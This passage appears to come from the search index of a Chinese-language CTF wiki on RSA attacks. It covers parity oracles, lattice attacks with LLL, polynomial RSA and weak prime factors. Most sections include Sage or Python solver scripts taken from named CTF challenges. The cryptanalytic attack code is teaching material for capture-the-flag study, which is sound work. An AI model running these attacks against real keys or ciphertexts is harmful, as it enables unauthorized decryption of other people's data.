$$m\u2019$$ \u7684\u6700\u4f4e\u4f4d lsb \u662f1\u8fd8\u662f0\u3002 \u56e0\u4e3a $$n$$ \u662f\u5947\u6570\uff0c\u800c $$2\\cdot m$$ \u662f\u5076\u6570\uff0c\u6240\u4ee5\u5982\u679c lsb \u662f0\uff0c\u8bf4\u660e$$(2\\cdot m)\\%n$$ \u662f\u5076\u6570\uff0c\u6ca1\u6709\u8d85\u8fc7 $$n$$\uff0c\u5373 $$m\\lt \\cfrac{n}{2}$$ \uff0c\u53cd\u4e4b\u5219 $$m\\gt \\cfrac{n}{2}$$ \u3002\u4e3e\u4e2a\u4f8b\u5b50\u5c31\u80fd\u660e\u767d $$2\\%3=2$$ \u662f\u5076\u6570\uff0c\u800c$$4\\%3=1$$ \u662f\u5947\u6570\u3002\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6784\u9020\u5bc6\u6587 $$c\u2019\u2019=((4^e)\\cdot c)\\%n$$ \u4f7f\u5176\u89e3\u5bc6\u540e\u4e3a $$m\u2019\u2019=(4\\cdot m)\\%n$$ \uff0c\u5224\u65ad \u7684\u5947\u5076\u6027\u53ef\u4ee5\u77e5\u9053 $$m\u2019\u2019$$ \u548c $$\\cfrac{n}{4}$$ \u7684\u5927\u5c0f\u5173\u7cfb\u3002\u6240\u4ee5\u6211\u4eec\u5c31\u6709\u4e86\u4e00\u4e2a\u4e8c\u5206\u7b97\u6cd5\uff0c\u53ef\u4ee5\u5728\u5bf9\u6570\u65f6\u95f4\u5185\u5c06 $$m$$ \u7684\u8303\u56f4\u903c\u8fd1\u5230\u4e00\u4e2a\u8db3\u591f\u72ed\u7a84\u7684\u7a7a\u95f4\u3002 \u66f4\u591a\u4fe1\u606f\u53ef\u53c2\u8003\uff1a RSA Least-Significant-Bit Oracle Attack \u548c RSA least significant bit oracle attack \u3002 import decimal def oracle(): return lsb == 'odd' def partial(c, e, n): k = n.bit_length() decimal.getcontext().prec = k # for 'precise enough' floats lo = decimal.Decimal(0) hi = decimal.Decimal(n) for i in range(k): if not oracle(c): hi = (lo + hi) / 2 else: lo = (lo + hi) / 2 c = (c * pow(2, e, n)) % n # print i, int(hi - lo) return int(hi) \u200b","title":"Least Significant Bit Oracle Attack \uff08LSB Oracle Attack / Parity Oracle\uff09"},{"location":"other/RSA/#common-private-exponentd","text":"\u52a0\u5bc6\u7528\u540c\u6837\u7684\u79c1\u94a5\u5e76\u4e14\u79c1\u94a5\u6bd4\u8f83\u77ed\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u52a0\u5bc6\u7cfb\u7edf\u88ab\u7834\u89e3\u3002 \u5047\u5b9a\uff1a $$\\begin{cases} e_1d=1+k_1\\varphi(N_1) \\newline e_2d=1+k_2\\varphi(N_2) \\newline {\\vdots} \\newline e_rd=1+k_r\\varphi(N_r) \\end{cases}$$ \u5176\u4e2d\uff0c$$N_1 \\lt N_2 \\lt \\cdots \\lt N_r \\lt 2N_1$$\u3002 \u6784\u9020\u683c\uff1a $$B_r=\\begin{bmatrix}{M}&{e_1}&{e_2}&{\\cdots}&{e_{r}}\\newline {0}&{-N_1}&{0}&{\\cdots}&{0}\\newline{0}&{0}&{-N_2}&{\\cdots}&{0}\\newline{\\vdots}&{\\vdots}&{\\vdots}&{\\ddots}&{\\vdots}\\newline{0}&{0}&{0}&{\\cdots}&{-N_r}\\newline\\end{bmatrix}$$ \u5176\u4e2d $$M=\\lfloor N_r^{\\frac{1}{2}} \\rfloor$$\u3002 \u518d\u5229\u7528 LLL\u7b97\u6cd5 \u8fdb\u884c\u89c4\u7ea6\u5f97\u5230 $$\\vert b_1\\vert=Md$$\uff0c\u5219 $$d=\\cfrac{\\vert b_1 \\vert}{M}$$\uff0c\u4ece\u800c\u89e3\u5bc6\u5bc6\u6587\u5f97\u5230\u660e\u6587\u3002 \u4f7f\u7528\u6761\u4ef6\uff1a $$d \\lt N_r^{\\delta_r}\uff0c\\delta_r \\lt \\cfrac{1}{2}-\\cfrac{1}{2(r+1)}-\\log_{N_r}{(6)}$$ * \u53c2\u8003\uff1a Lattice Based Attack on Common Private Exponent RSA SCTF 2020 - RSA ###Sage### from gmpy2 import * e0= n0= c0= e1= n1= c1= e2= n2= c2= M=iroot(int(n2),int(2))[0] a=[0]*4 a[0]=[M,e0,e1,e2] a[1]=[0,-n0,0,0] a[2]=[0,0,-n1,0] a[3]=[0,0,0,-n2] Mat = matrix(ZZ,a) Mat_LLL=Mat.LLL() d = abs(Mat_LLL[0][0])/M print(bytes.fromhex(hex(pow(c1,int(d),int(n1)))[2:])) \u200b","title":"Common Private Exponent\uff08\u5171\u79c1\u94a5\u6307\u6570\u653b\u51fb\uff0cd\u76f8\u540c\uff09"},{"location":"other/RSA/#_5","text":"\u9002\u7528\u60c5\u51b5\uff1a2-4\u7ec4 $$e$$\uff0c\u4e14 $$d$$ \u8f83\u5c0f \u7ed9\u5b9a2\u7ec4 $$g=\\gcd(p-1,q-1),\\lambda(n)=\\frac{\\varphi(n)}{g},s=1-p-q$$ \u4e14\u6709 $$ed-k\\lambda(n)=1$$\uff0c\u5f97\u5230 $$edg-kn=g+ks\\quad (1)$$ \u8bbe $$e_1$$ \u5bf9\u5e94 $$k_1$$\uff0c$$e_2$$ \u5bf9\u5e94 $$k_2$$\uff0c\u5219\u6709 $$k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\\quad (2)$$ \u7531(1)(2)\u6709\uff1a $\\left\\{ \\begin{matrix} e_{1}d_{1}g-k_{1}n=g+k_{1}s \\newline k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1} \\newline e_{1}e_{2}d_{1}d_{2}g_{2}-e_{1}d_{1}gk_{2}n-e_{2}d_{2}gk_{1}n+k_{1}k_{2}n^{2}=(g+k_{1}s)(g+k_{2}s) \\end{matrix} \\right.$ \u4e0a\u8ff0\u7b49\u5f0f\u7ec4\u4e5f\u53ef\u8868\u793a\u4e3a $$bL_2 =[k_{1}k_{2},k_{2}d_{1}g,k_{1}d_{2}g,d_{1}d_{2}g^{2}]\\cdot\\left[ \\begin{matrix} n & -M_{1}n & 0 & n^{2} \\newline 0 & M_{1}e_{1} & M_{2}e_{1} & -e_{1}n \\newline 0 & 0 & -M_{2}e_{2} & -e_{2}n \\newline 0 & 0 & 0 & e_{1}e_{2} \\end{matrix} \\right] =[k_{1}k_{2}n,M_{1}k_{2}(g+k_{1}s),M_{2}g(k_{2}-k_{1})\uff0c(g+k_{1}s)(g+k_{2}s)]$$ \uff08\u5176\u4e2d $$M_{1}=n^{1/2},M_{2}=n^{1+\\alpha_{2}},d\\approx n^{\\alpha_{2}}$$\uff09 \u5bf9\u90e8\u5206\u53c2\u6570\u8fdb\u884c\u4e0a\u754c\u4f30\u8ba1\uff0ck\u4e0a\u754c\u8fd1\u4f3c\u4e8e $$d\\approx N^{\\alpha_{2}}$$, $$|s|$$ \u4e0a\u754c $$\\approx N^{1/2}$$\uff0c$$g$$ \u4e00\u822c\u76f8\u5bf9\u6781\u5c0f \u56e0\u6b64\u4e0a\u9762\u7684\u77e9\u9635\u8868\u793a $$BA=C$$ \u4e2d\uff0c$$C$$ \u7684\u6bcf\u4e2a\u5143\u7684size\u90fd\u8fd1\u4f3c $$n^{1+2\\alpha_{2}}$$\uff0c\u6240\u4ee5 $$|C|\\approx 2\\cdot n^{1+2\\alpha_{2}}$$ $$B$$ \u4f5c\u4e3a\u683c\u57fa\u7684\u683c\u4e2d\uff0c\u6700\u77ed\u5411\u91cf\u7531Minkowski Bounds\u77e5 $$\\approx \\sqrt{4}\\det(B)^{1/4}\\approx 2\\cdot n^{(13/2+\\alpha_{2})/4}$$ \u56e0\u6b64\u53ea\u8981\u6ee1\u8db3 $$n^{1+2\\alpha_{2}}<n^{(13/2+\\alpha_{2})/4}$$ \u5373\u53ef\u5c06\u95ee\u9898\u8f6c\u5316\u4e3aSVP\uff08$$\\alpha_{2}<\\frac{5}{14}$$\uff09 from sage.all import * import gmpy2 N = e1 = e2 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**0.5) M2 = int( gmpy2.mpz(N)**(1+alpha2) ) D = diagonal_matrix(ZZ, [N, M1, M2, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2], [0, e1, -e1, -e1*N], [0, 0, e2, -e2*N], [0, 0, 0, e1*e2] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi = (x[0,1]/x[0,0]*e1).floor() try: d = inverse_mod( 65537, phi) m = hex(power_mod(c, d, N))[2:] if m.startswith('44415343'): print(i) print(bytes.fromhex(m)) break except: pass \u53c2\u8003\uff1a De1CTF 2020 - easyRSA \u7ed9\u5b9a3\u7ec4 \u7c7b\u4f3c2\u7ec4\u60c5\u51b5\uff0c\u5176\u4e2d $$b=[k_1k_2k_3,d_1gk_2k_3,k_1d_2gk_3,d_1d_2g^2k_3,k_1k_2d_3g,k_1d_3g,k_2d_3g,d_1d_2d_3g^3]$$ $$L_3=\\left[\\begin{matrix} 1-N & 0 & N^2 & 0 & 0 & 0 & -N^3 \\newline e_1 & -e_1 & -e_1N & -e & 0 & e_1N & e_1N^2 \\newline 0 & e_2 & -e_2N & 0 & e_2N & 0 & e_2N^2 \\newline 0 & 0 & e_1e_2 & 0 & -e_1e_2 & -e_1e_2 & -e_1e_2N \\newline 0 & 0 & 0 & e_3 & -e_3N & -e_3N & e_3N^3 \\newline 0 & 0 & 0 & 0 & e_1e_3 & 0 & -e_1e_3N \\newline 0 & 0 & 0 & 0 & 0 & e_2e_3 & -e_2e_3N \\newline 0 & 0 & 0 & 0 & 0 & 0 & e_1e_2e_3 \\end{matrix}\\right] \\times D$$ \u5176\u4e2d $$D={\\rm diag}(N^{3/2},N,N^{(3/2)+\\alpha_3},N^{1/2},N^{(3/2)+\\alpha_3},N^{1+\\alpha_3},N^{1+\\alpha_3}\uff0c1)$$ \u53c2\u8003\uff1a 3kCTF - RSA Textbook from sage.all import * import gmpy2 N = e1 = e2 = e3 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**(3./2)) M2 = int( gmpy2.mpz(N) ) M3 = int(gmpy2.mpz(N)**(3./2 + alpha2)) M4 = int( gmpy2.mpz(N)**(0.5) ) M5 = int( gmpy2.mpz(N)**(3./2 + alpha2) ) M6 = int( gmpy2.mpz(N)**(1.+alpha2) ) M7 = int( gmpy2.mpz(N)**(1.+alpha2) ) D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2, 0, 0, 0, -N**3], [0, e1, -e1, -e1*N, -e1, 0, e1*N, e1*N**2], [0, 0, e2, -e2*N, 0, e2*N, 0, e2*N**2], [0, 0, 0, e1*e2, 0, -e1*e2, -e1*e2, -e1*e2*N], [0, 0, 0, 0, e3, -e3*N, -e3*N, e3*N**2], [0, 0, 0, 0, 0, e1*e3, 0, -e1*e3*N], [0, 0, 0, 0, 0, 0, e2*e3, -e2*e3*N], [0, 0, 0, 0, 0, 0, 0, e1*e2*e3] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi_ = (e1*x[0,1]/x[0,0]).floor() try: d = inverse_mod( 65537, phi_) m = hex(power_mod(c, d, N))[2:] if m.startswith('44415343'): print(i) print(bytes.fromhex(m)) break except: pass \u7ed9\u5b9a\u66f4\u591a\u7ec4 \u897f\u6e56\u8bba\u5251 2021 - WienerStudyTwice * \u53c2\u8003Paper Common Modulus Attacks on Small Private Exponent RSA and Some Fast Variants (in Practice) Extending Wiener\u2019s Attack in the Presence of Many Decrypting Exponents \u200b","title":"\u591a\u7ec4\u4f4e\u89e3\u5bc6\u6307\u6570\u653b\u51fb"},{"location":"other/RSA/#rsa","text":"\u5728\u6574\u6570RSA\u539f\u7406\u57fa\u7840\u4e0a\u5c06\u591a\u9879\u5f0f\u4ee3\u5165\u5206\u6790\uff1a \u5728\u6709\u9650\u57df\u4e0a\u9009\u53d6\u4e24\u4e2a\u4e0d\u53ef\u7ea6\u591a\u9879\u5f0f $$g(p),g(q)$$\uff0c$$g(n)=g(p) \\cdot g(q)$$\uff0c\u8ba1\u7b97\u51fa $$g(n)$$ \u7684\u6b27\u62c9\u51fd\u6570 $$\\varphi(g(n))=\\varphi$$\uff0c \u9009\u53d6\u4e00\u4e2a\u6574\u6570 $$e$$ \u4f5c\u4e3a\u516c\u94a5\uff0c$$e$$ \u4e0e $$\\varphi$$ \u662f\u4e92\u7d20\u7684\uff0c\u90a3\u4e48\u5bf9\u4e8e\u660e\u6587 $$g(m)$$\uff0c\u52a0\u5bc6\u8fc7\u7a0b\u4e3a $$g(m)^e \\equiv g(c) \\pmod {g(n)}$$\uff0c \u8ba1\u7b97\u79c1\u94a5 $$d$$ \u6ee1\u8db3 $$ed \\equiv 1 \\pmod \\varphi$$\uff0c\u5219 $$g(c)^d \\equiv (g(m)^e)^d \\equiv g(m)^{ed} \\equiv g(m)^{\\varphi+1} \\pmod {g(n)}$$\uff0c \u540c\u6837\u8003\u8651 $$g(n)$$ \u4e0e $$g(m)$$ \u4e92\u7d20\uff0c\u6b27\u62c9\u5b9a\u7406\u5bf9\u4e8e\u591a\u9879\u5f0f\u4ea6\u6210\u7acb\uff0c \u5f97\u5230 $$g(m)^{\\varphi+1} \\equiv g(m) \\pmod {g(n)}$$\uff0c\u6240\u4ee5 $$g(c)^d \\equiv g(m) \\pmod {g(n)}$$\u3002 \u663e\u7136RSA\u5bf9\u4e8e\u6574\u6570\u7684\u4f53\u5236\u53ef\u4ee5\u9002\u7528\u4e8e\u6709\u9650\u57df\u4e0a\u7684\u591a\u9879\u5f0f\u3002 \u2605\u6ce8\u610f\uff1a \u5bf9\u4e8e\u7d20\u6570 $$x$$\uff0c$$\\varphi(x)=x-1$$\uff0c\u4f46\u662f\u5bf9\u4e8e\u4e0d\u53ef\u7ea6\u591a\u9879\u5f0f $$g(x)$$\uff0c$$\\varphi(g(x))=p^n-1$$\u3002\uff08\u6b64 $$p$$ \u4e3a $$GF(p)$$ \u7684\u6a21\uff0c\u6b64 $$n$$ \u4e3a\u591a\u9879\u5f0f\u6700\u9ad8\u9879\u6b21\u6570\uff09 \u539f\u56e0\uff1a \u7531\u6b27\u62c9\u51fd\u6570\u5b9a\u4e49\u672c\u8eab\uff0c\u6b27\u62c9\u51fd\u6570\u662f\u5c0f\u4e8e $$n$$ \u7684\u6240\u6709\u4e0e $$n$$ \u4e92\u8d28\u7684\u6570\u7684\u4e2a\u6570\u3002 \u591a\u9879\u5f0f\u7684\u6b27\u62c9\u51fd\u6570\u5219\u7c7b\u4f3c\uff0c\u8868\u793a\u4e0d\u9ad8\u4e8e $$g(x)$$ \u5e42\u7ea7\u7684\u73af\u5185\u6240\u6709\u591a\u9879\u5f0f\u4e2d\uff0c\u4e0e $$g(x)$$ \u65e0\u516c\u56e0\u5f0f\uff08\u975e1\uff09\u7684\u5176\u4ed6\u591a\u9879\u5f0f\u7684\u4e2a\u6570\uff0c\u6240\u4ee5\u6bcf\u4e00\u4e2a\u4e0d\u9ad8\u4e8e $$g(x)$$ \u5e42\u7ea7\u7684\u73af\u5185\u591a\u9879\u5f0f\uff08\u9664\u4e86\u5b83\u81ea\u5df1\uff09\u5747\u6ee1\u8db3\u6b64\u6761\u4ef6\u3002 #\u811a\u672c1 #Sage #\u5df2\u77e5p,n,m^e p= P = PolynomialRing(Zmod(p), name = 'x') x = P.gen() e = n = c = #\u5206\u89e3N q1, q2 = n.factor() q1, q2 = q1[0], q2[0] #\u6c42\u03c6\uff0c\u6ce8\u610f\u6c42\u6cd5\uff0c phi = (p**q1.degree() - 1) * (p**q2.degree() - 1) assert gcd(e, phi) == 1 d = inverse_mod(e, phi) m = pow(c,d,n) #\u53d6\u591a\u9879\u5f0f\u7cfb\u6570 flag = bytes(m.coefficients()) print(\"Flag: \", flag.decode()) #\u811a\u672c2 #Sage #\u5df2\u77e5p=2,n,e,c p = P = PolynomialRing(GF(p), name = 'x') x = P.gen() e = n = R.<a> = GF(2^2049) c = [] q1, q2 = n.factor() q1, q2 = q1[0], q2[0] phi = (p**q1.degree() - 1) * (p**q2.degree() - 1) assert gcd(e, phi) == 1 d = inverse_mod(e, phi) ans = '' for cc in c: cc = P(R.fetch_int(cc)) m = pow(cc,d,n) m = R(P(m)).integer_representation() print(m) ans += chr(m) print(ans) \u53c2\u8003\uff1a 0ctf - babyrsa watevrCTF 2019 - Swedish RSA InCTF 2020 - PolyRSA Polynomial based RSA \u200b","title":"\u591a\u9879\u5f0fRSA"},{"location":"other/RSA/#weak-prime-factors-p","text":"\u9002\u7528\u60c5\u51b5\uff1a$$p$$ \u6ee1\u8db3 $$ap=u_0+M_1u_1+\\cdots+M_ku_k$$ \u5148\u6839\u636e $$n$$ \u786e\u5b9a $$M$$ \u7684\u5927\u5c0f\uff0c\u518d\u6839\u636e $$M$$ \u9009\u53d6\u7b26\u5408\u8981\u6c42\u7684 $$k$$ \u548c $$c$$\uff0c\u7136\u540e\u6784\u9020\u4e00\u4e2a\u683c\u5982\u4e0b\uff1a $$M(\\mathcal{L})=\\begin{bmatrix}{1}&{0}&{0}&{\\cdots}&{0}&{CM^{2k}} \\newline {0}&{1}&{0}&{\\cdots}&{0}&{CM^{2k-1}} \\newline {\\vdots}&{\\vdots}&{\\vdots}&{\\ddots}&{\\vdots}&{\\vdots} \\newline {0}&{0}&{0}&{\\cdots}&{1}&{CM} \\newline {0}&{0}&{0}&{\\cdots}&{0}&{-CN} \\newline \\end{bmatrix}$$ \u7528LLL\u7b97\u6cd5\u8fdb\u884c\u683c\u57fa\u89c4\u7ea6\uff0c\u5c06\u89c4\u7ea6\u540e\u7684\u67d0\u4e2a\u5411\u91cf\u4f5c\u4e3a\u591a\u9879\u5f0f\u7cfb\u6570\uff0c\u518d\u5bf9\u591a\u9879\u5f0f\u8fdb\u884c\u5206\u89e3\uff0c\u5373\u53ef\u5b8c\u6210\u5bf9 $$n$$ \u7684\u5206\u89e3\u3002 \u53c2\u8003 Factoring RSA moduli with weak prime factors N1CTF2020 - easyRSA from tqdm import tqdm import gmpy2 class success(Exception): pass def attack_weak_prime(basenum, exp, n): m = basenum^exp k = len(n.str(base=basenum))//(2*exp) + 1 c = gmpy2.iroot(2*k^3, int(2)) # assert c[1] == True tmp = int(c[0]) try: for c in tqdm(range(1, tmp)): amount = 2*k+1 M = Matrix(RationalField(), amount, amount) for i in range(amount): M[i, i] = 1 M[i, amount-1] = c*m^(2*k-i) M[amount-1, amount-1] = -c*n new_basis = M.LLL(delta=0.75) for j in range(amount): last_row = list(new_basis[j]) last_row[-1] = last_row[-1]//(-c) poly = sum(e * x^(k*2-i) for i,e in enumerate(last_row)) fac = poly.factor_list() if len(fac) == 2: p_poly, q_poly = fac p_coefficient = p_poly[0].list() q_coefficient = q_poly[0].list() ap = sum(m^i * j for i,j in enumerate(p_coefficient)) bq = sum(m^i * j for i,j in enumerate(q_coefficient)) p = gcd(ap, n) q = gcd(bq, n) if (p*q == n) and (p != 1) and (q != 1): raise success except: print ('n =', n) print ('p =', p) print ('q =', q) print ('p*q == n ?', bool(p*q == n)) if __name__ == '__main__': print ('[+] Weak Prime Factorization Start!') print ('-------------------------------------------------------------------------------------------------------------------------------') basenum, exp = (3, 66) n = 32846178930381020200488205307866106934814063650420574397058108582359767867168248452804404660617617281772163916944703994111784849810233870504925762086155249810089376194662501332106637997915467797720063431587510189901 \u200b","title":"Weak prime factors \uff08p\u5177\u7ebf\u6027\u7279\u5f81\uff09"},{"location":"other/RSA/#_6","text":"","title":"\u5176\u4ed6\u7279\u522b\u60c5\u5f62"},{"location":"other/RSA/#multi-prime-rsa","text":"$$n=p_1^{k_1}p_2^{k_2}\\cdots p_m^{k_m} \\ \\Rightarrow \\begin{eqnarray}\\varphi(n) &=&\\varphi(p_1^{k_1})\\varphi(p_2^{k_2}) \\cdots \\varphi(p_m^{k_m}) \\ &=&(p_1^{k_1-1}\\cdot(p_1-1))(p_2^{k_2-1}\\cdot(p_2-1)) \\cdots (p_m^{k_m-1}\\cdot(p_m-1)) \\end{eqnarray}$$ \u200b * ##### next_prime() \u6839\u636e\u7d20\u6570\u5b9a\u7406\uff0c\u7d20\u6570\u7684\u5e73\u5747\u95f4\u9694\u4e3a\uff1a$$\\cfrac{x}{\\pi(x)} \\approx \\ln(x)$$\uff0c\u56e0\u6b64\u5e38\u89c1\u7684\u4e0b\u4e00\u4e2a\u7d20\u6570\u6bd4\u5f53\u524d\u7d20\u6570\u5927\u4e00\u70b9\uff0c\u4e00\u822c\u4e0d\u4f1a\u8d85\u8fc71500\u3002 \u53d8\u79cd1 \uff1a$$n=p \\cdot q \\cdot \\text{nextprime}(p) \\cdot \\text{nextprime}(q)$$ \u8d39\u9a6c\u56e0\u5f0f\u5206\u89e3 \u3002\u200b * \u7ed9 e,p,c $$c \\equiv m^e \\pmod n \\ \\Leftrightarrow c_1 \\equiv c \\pmod p \\equiv m^e \\pmod p$$ \u4ee4 $$ed_1 \\equiv 1 \\pmod {(p-1)}$$\uff0c\u6709 $$m \\equiv c^d \\pmod n \\equiv c_1^{d_1} \\pmod p$$\u3002 \u200b * ##### \u7ed9 e,d,modinv(q,p),c \u5df2\u77e5\uff1a$$p,q$$ \u540c\u6bd4\u7279\u4f4d\u6570\u3002 \u4ee4 $$cf=q^{-1} \\bmod p$$\uff0c\u6709 $$q\\cdot cf=1 \\pmod p$$\u3002 $$ed=1+k(p-1)(q-1)$$\uff0c \u6bd4\u8f83\u6bd4\u7279\u4f4d\u6570\uff0c$$k$$ \u4e0e $$e$$ \u540c\u957f\uff0c\u53ef\u7206\u7834 $$k$$\uff0c\u5f97 $$\\varphi(n)=(p-1)(q-1)=\\cfrac{ed-1}{k}$$\uff1b + \u4e0a\u5f0f $$\\varphi(n) =(p-1)(q-1) \\pmod p=-(q-1) \\pmod p$$\uff0c \u7ed3\u5408 $$q\\cdot cf=1 \\pmod p$$\uff0c\u5373 $$q\\cdot cf-1=0 \\pmod p$$\uff0c \u8054\u7acb\uff1a $$\\begin{eqnarray} \\varphi(n)&=&(p-1)(q-1) \\ &=&pq-p-q+1 \\ &=&n-p-q+1 \\end{eqnarray}$$ $$\\begin{eqnarray} cf\\cdot \\varphi(n)&=&cf\\cdot(n-p-q+1) \\ &=&cf\\cdot n-cf\\cdot p-cf\\cdot q+cf \\end{eqnarray}$$ $$\\begin{eqnarray} cf\\cdot \\varphi(n) \\bmod p&=&(cf\\cdot n-cf\\cdot p-cf\\cdot q+cf) \\bmod p \\ &=&0-0-(cf\\cdot q)+cf \\bmod p \\ &=&-1+cf \\bmod p \\end{eqnarray}$$ \u6709 $$1+cf\\cdot \\varphi(n)-cf=0\\pmod p$$\uff0c \u5373$$x=1+cf\\cdot \\varphi(n)-cf$$ \u80fd\u88ab $$p$$ \u6574\u9664\uff1b + \u7531\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u5b58\u5728 $$r$$ \u6ee1\u8db3 $$r^{p-1}=1 \\pmod p$$\uff0c $$\\begin{eqnarray}r^{\\varphi(n)}&=&(r^{(p-1)})^{(q-1)} \\ &=&1^{(q-1)} \\pmod p \\ &=&1 \\pmod p \\end{eqnarray}$$\uff0c \u56e0\u5bf9\u4e8e\u4efb\u610f $$r,k_1,k_2$$\uff0c\u5f53 $$k_2$$ \u4e3a $$k_1$$ \u56e0\u5b50\u65f6\uff0c$$r \\bmod k_2=(r \\bmod k_1) \\bmod k_2$$\uff0c \u6545 $$r^{\\varphi(n)} \\bmod p=(r^{\\varphi(n)} \\bmod x) \\bmod p=1 \\bmod p=kp$$\uff0c \u5df2\u77e5 $$\\varphi(n)$$\uff0c\u7531 $$(r^{\\varphi(n)} \\bmod x) \\bmod p=kp$$ \u53ef\u5f97\u5230\u591a\u7ec4 $$p$$ \u7684\u4e58\u79ef\uff0c\u8ba1\u7b97 $$\\gcd$$ \u53ef\u5f97\u5230 $$p$$\uff1b + \u7531 $$q\\cdot cf=1 \\pmod p$$ \u6c42\u6a21\u9006\u53ef\u5f97 $$q$$\uff0c\u518d\u7528 $$c$$ \u8ba1\u7b97\u51fa $$m$$\u3002 \u53c2\u8003\uff1a TSG CTF 2020 - Modulus Amittendus \u200b * ##### gcd(e,\u03c6(n)) \u2260 1 $$\\gcd(e,\\varphi(n))\\neq 1$$ \u65f6\uff0c$$e$$ \u4e0e $$\\varphi(n)$$ \u4e0d\u4e92\u7d20\uff0c $$m^e \\equiv (m^{\\gcd(e,\\varphi(n))})^{\\frac{e}{\\gcd(e,\\varphi(n))}} \\equiv c \\pmod n$$\uff0c\u8ba1\u7b97 $$\\frac{e}{\\gcd(e,\\varphi(n))}$$ \u7684\u6a21\u9006 $$d\u2019$$\uff0c \u5219 $$c^{d\u2019}\\equiv m^{\\gcd(e,\\varphi(n))}\\pmod n$$\u3002 \u5f53 $$\\gcd(e,\\varphi(n))$$ \u8f83\u5c0f\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u5bf9 $$c$$ \u5f00\u6839\uff0c\u6709\u4e24\u79cd\u60c5\u51b5\uff1a $$m^e = c<n$$\uff0c\u8fd9\u79cd\u60c5\u51b5\u76f4\u63a5\u5bf9 $$c$$ \u5f00 $$e$$ \u6b21\u65b9\u5373\u53ef\uff1b $$m^e = c>n$$\uff0c\u8fd9\u79cd\u60c5\u51b5\u9700\u8981\u5728\u6709\u9650\u57df\u4e0b\u5bf9 $$c$$ \u5f00\u65b9\uff0c\u4e00\u822c\u5148\u8ba1\u7b97 $$c_p=c \\bmod p$$\uff0c$$c_q=c \\bmod q$$\uff0c\u5206\u522b\u6c42\u51fa $$c_p,c_q$$ \u5728 $$c$$ \u4e0b\u7684 $$e$$ \u6b21\u6839\uff08\u53ef\u80fd\u6709\u591a\u4e2a\uff09\uff0c\u7136\u540e\u4f7f\u7528CRT\u904d\u5386\u6240\u6709\u7ec4\u5408\uff0c\u5206\u522bcheck\u5f97\u51fa\u660e\u6587\u3002\u5f53 $$\\gcd(e,\\varphi(n))$$ \u8f83\u5927\u65f6\uff0c\u6c42 $$p,q$$ \u7684 $$e$$ \u6b21\u6839\u6b65\u9aa4\u9700\u8981\u66ff\u6362\u4e3a\u4e00\u4e9b\u6709\u9650\u57df\u5f00\u6839\u7684\u9ad8\u6548\u7b97\u6cd5\uff08\u5982AMM\u7b97\u6cd5\u7b49\uff09\u8fdb\u884c\u8ba1\u7b97\u3002 \u53c2\u8003\uff1a De1CTF2019 - Baby RSA 0ctf 2016 - RSA? \u200b * ##### e|(p-1), e|(q-1) \u4e0a\u9762\u7684 $$\\gcd(e,\\varphi(n))\\neq 1$$ \u60c5\u51b5\u4e0d\u9488\u5bf9 $$\\gcd(e,\\varphi(n))= e$$\uff0c\u8fd9\u91cc\u5bf9 $$e\\mid (p-1),e\\mid (q-1)$$ \u7684\u7279\u6b8a\u60c5\u51b5\u8fdb\u884c\u8ba8\u8bba\u3002 \u89e3\u9898\u601d\u8def\u5373\u6c42\u89e3 $$m \\bmod p$$ \u548c $$m \\bmod q$$ \uff0c\u518d\u901a\u8fc7CRT\u8fd8\u539f $$m \\bmod n$$\u3002\u4e3b\u8981\u96be\u70b9\u5219\u662f\u5728 $$\\text{GF}(p)$$ \u4e0a\u6c42 $$e$$ \u6b21\u6839\u3002 \u5728\u6709\u9650\u57df\u4e0a\u6c42r-th root\u6709\u4e24\u4e2a\u5e38\u89c1\u7b97\u6cd5\uff08Adleman-Manders-Miller algorithm\u548cCipolla-Lehmer algorithm\uff09\uff0cNamhun Koo\u63d0\u51fa\u4e00\u79cd\u66f4\u5177\u4e00\u822c\u6027\u7684\u5f00\u6839\u7b97\u6cd5\uff0c\u4e14\u5728 $$s$$ \u8db3\u591f\u5c0f\u7684\u65f6\u5019\u66f4\u9ad8\u6548\uff08$$r^{s}\\mid (p-1),r^{s}\\nmid (p-1)$$\uff09\u3002 \u2605 \u53c2\u8003 \uff1a NCTF 2019 - easyRSA \uff08 Adleman-Manders-Miller rth Root Extraction Method \uff09 \u672c\u9898\u5219\u4e3a $$e$$ \u548c $$p-1$$ \uff08\u6216 $$q-1$$\uff09\u7684\u6700\u5927\u516c\u7ea6\u6570\u5c31\u662f $$e$$ \u672c\u8eab\uff0c\u4e5f\u5c31\u662f\u8bf4 $$e\\mid (p-1)$$\uff0c\u53ea\u6709\u5bf9 $$c$$ \u5f00 $$e$$ \u6b21\u65b9\u6839\u624d\u884c\u3002 \u53ef\u4ee5\u5c06\u540c\u4f59\u65b9\u7a0b $$m^e \\equiv c \\pmod n$$ \u5316\u6210 $$\\begin{cases} m^e \\equiv c \\pmod p \\ m^e \\equiv c \\pmod q \\end{cases}$$ \u7136\u540e\u5206\u522b\u5728 $$\\text{GF}(p)$$ \u548c $$\\text{GF}(q)$$ \u4e0a\u5bf9 $$c$$ \u5f00 $$e$$ \u6b21\u65b9\u6839\uff0c\u518d\u7528CRT\u7ec4\u5408\u4e00\u4e0b\u5373\u53ef\u5f97\u5230\u5728 $$\\bmod n$$ \u4e0b\u7684\u89e3\u3002 \u95ee\u9898\u662f\uff0c \u5982\u4f55\u5728\u6709\u9650\u57df\u5185\u5f00\u6839 \uff1f \u8fd9\u91cc $$e$$ \u4e0e $$p-1$$ \u548c $$q-1$$ \u90fd\u4e0d\u4e92\u7d20\uff0c\u4e0d\u80fd\u7b80\u5355\u5730\u6c42\u4e2a\u9006\u5143\u5c31\u5b8c\u4e8b\u3002 \u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c \u5f00\u5e73\u65b9\u6839 \u53ef\u4ee5\u7528 Tonelli\u2013Shanks algorithm \uff0c Wiki 